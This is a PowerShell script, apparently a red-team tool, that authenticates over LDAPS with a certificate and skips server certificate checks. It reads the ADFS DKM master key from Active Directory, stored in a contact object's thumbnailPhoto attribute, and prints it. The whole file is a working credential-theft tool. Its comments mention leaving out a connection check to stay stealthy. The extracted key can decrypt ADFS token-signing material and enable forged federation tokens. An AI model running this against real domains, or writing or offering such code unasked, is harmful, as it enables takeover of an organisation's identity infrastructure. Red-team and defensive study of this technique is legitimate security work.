<#
.SYNOPSIS
    Script to read ADFS DKM key from domain using x509 client certificate authentication.

.DESCRIPTION
    This script was made for RT engagements. 
    It is not advised to use this without first drinking 5 cups of coffee!

    This script uses x509 certificate based authentication against LDAP to read LDAP properties

    File-Name:  ADSI_DumpADFSDKMKey_X509.ps1
    Author:     Ville Koch (@vegvisir87, https://github.com/ville87)
    Version:    v1.0 (25/10/2024)

.LINK
    TODO

.EXAMPLE
    Read the ADFS DKM key from the domain:
    .\ADSI_DumpADFSDKMKey_X509.ps1 -CertPath C:\TEMP\domadmin.pfx -domain lab.local -DCIP 10.0.0.4

#>

#################################### PARAMETERS ###########################################
[CmdletBinding()]
Param (
    # CertPath: Path to pfx client certificate used for authenticate to LDAP server
    [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
    [ValidateScript({
        if( -Not ($_ | Test-Path) ){
            throw "Provided certificate file does not exist"
        }
        return $true
    })]
    [System.IO.FileInfo]$CertPath,

    # domain: Domain to connect to. Should be in format domain.tld (currently no built-in validation)
    [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
    [string]$domain,

    # DCIP: DC IP address to use to connect to via 636
    [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
    [ValidateScript({
        if( -Not ([bool]($_ -as [ipaddress]))){
            throw "Provided DC IP is not a valid IP address"
        }
        return $true
    })]
    [string]$DCIP
)

Begin {
    
#################################### VARIABLES ###########################################

    [string]$scriptPath             = Split-Path -Parent $MyInvocation.MyCommand.Definition;
    if($scriptPath -eq ''){ $scriptPath = (Get-Location).Path }
    [string]$DateTimeString         = Get-Date -Format 'dd_MM_yyyy-HH_mm_ss'
    [bool]$loggingenabled           = $false # if set to true, write output to logfile
    [string]$logfile                = "$DateTimeString"+"-ADSI_AddUser_X509.log"
    [string]$logfilepath            = "$scriptPath\$logfile"
    [string]$baseDN                 = "DC=$(($domain -split "\.")[0]),DC=$(($domain -split "\.")[1])"

#################################### FUNCTIONS ###########################################
    function printInfo { 
        Param (
        [Parameter(Mandatory = $true)][string]$info, # String to log
        [Parameter(Mandatory = $true)][ValidateSet("INFO","WARNING","ERROR")][string]$level
        )
        if($level -eq "ERROR"){
            Write-Host -ForegroundColor Red -BackgroundColor Black "$('[{0:HH:mm}]' -f (Get-Date)) - $level - $info"
        }elseif($level -eq "WARNING"){
            Write-Host -ForegroundColor Yellow -BackgroundColor Black "$('[{0:HH:mm}]' -f (Get-Date)) - $level - $info"
        }else{
            Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) - $level - $info"
        }
            
        if($loggingenabled){
            "$('[{0:HH:mm}]' -f (Get-Date)) - $level - $info" | Out-File -FilePath $logfilepath -Append
        }
    }

} # Begin

#################################### MAIN ################################################
Process {

    try {
        printInfo -info "Started script..." -level "INFO"
        <# Currently left out because not OPSEC friendly!
        if(([System.Net.Sockets.TcpClient]::new().ConnectAsync("$DCIP", 636).Wait(1000)) -eq $false){ 
            printInfo -info "Could not connect to $DCIP on port 636. Cannot continue..." -level "ERROR"
            Exit
        }#>
        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.Net")
        printInfo -info "Connecting to DC $DCIP on port 636 and starting authentication..." -level "INFO"
        $Ident = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier -ArgumentList @("$DCIP`:636")
        $c = New-Object System.DirectoryServices.Protocols.LdapConnection $Ident
        $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, "", 'Exportable')
        $null = $c.ClientCertificates.Add($Cert)
        $c.SessionOptions.SecureSocketLayer = $true;
        $c.AuthType = "Kerberos"
        $c.SessionOptions.VerifyServerCertificate = {
            param($conn, [System.Security.Cryptography.X509Certificates.X509Certificate2]$cert)           
            Write-Verbose ($cert.ToString($true))
            $true
        }
        # 1.3.6.1.4.1.4203.1.11.3 = OID for LDAP_SERVER_WHO_AM_I_OID (see MS-ADTS 3.1.1.3.4.2 LDAP Extended Operations)
        $ExtRequest = New-Object System.DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = $c.SendRequest($ExtRequest)
        $str = [System.Text.Encoding]::ASCII.GetString($resp.ResponseValue)
        if([string]::IsNullOrEmpty($str)) {
            printInfo -info "Authentication against $DCIP using provided certificate failed! Cannot continue..." -level "ERROR"
            Exit
        } else {
            printInfo -info "Authenticated against $DCIP as user $str" -level "INFO"
        }

        
        $Request = New-Object System.DirectoryServices.Protocols.SearchRequest
        $Request.DistinguishedName = "CN=ADFS,CN=Microsoft,CN=Program Data,$baseDN"
        $Request.Filter = "(&(ObjectClass=Contact)(!(name=CryptoPolicy)))"
        $Request.Scope = "Subtree"
        $Response = $c.SendRequest($Request)

        # Currently hardcoded to handle only ADFS DKM key
        $key = $Response.Entries[0].Attributes['thumbnailPhoto'][0]
        if($null -eq $key){
            $key = $false
            printInfo -info "The property specified could not be found in AD. Cannot continue..." -level "ERROR"
            Exit
        }

        try{
            $keyString = [System.BitConverter]::ToString($key)
            printInfo -info "Found the DKM key: $keystring" -level "INFO"
        }catch{
            printInfo -info "Something went wrong when trying to convert the property to string format. Maybe not a valid DKM key?" -level "ERROR"
        }
        $c.Dispose()
        Write-host "############################################################################"
        printInfo -info "Script done." -level "INFO"
        $ErrorLevel = 0        
    } catch {
        printInfo -info "There was an error when running the script. Error:`r`n$_" -level "ERROR"
    }
} # Process

End {
    if ($ErrorLevel -eq "0") {
        printInfo -info "Script ended succesfully" -level "INFO"
    }else{
        printInfo -info "Script ended with ErrorLevel: $ErrorLevel" -level "WARNING"
    }
} # End